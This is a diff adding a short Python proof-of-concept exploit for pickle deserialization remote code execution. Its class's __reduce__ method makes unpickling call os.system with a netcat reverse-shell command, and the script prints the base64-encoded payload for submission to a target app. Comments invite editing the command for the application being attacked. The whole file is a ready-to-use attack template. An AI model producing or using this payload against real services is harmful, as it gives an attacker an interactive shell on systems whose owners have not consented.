@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+
+import pickle
+import base64
+import os
+
+# Poc of a deserialization RCE exploit
+# Edit the cmd = () to customize for the app your are attacking
+# Points to a netcat listener to pop a reverse shell
+class RCE:
+    def __reduce__(self):
+        cmd = ('/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
+        return os.system, (cmd,)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
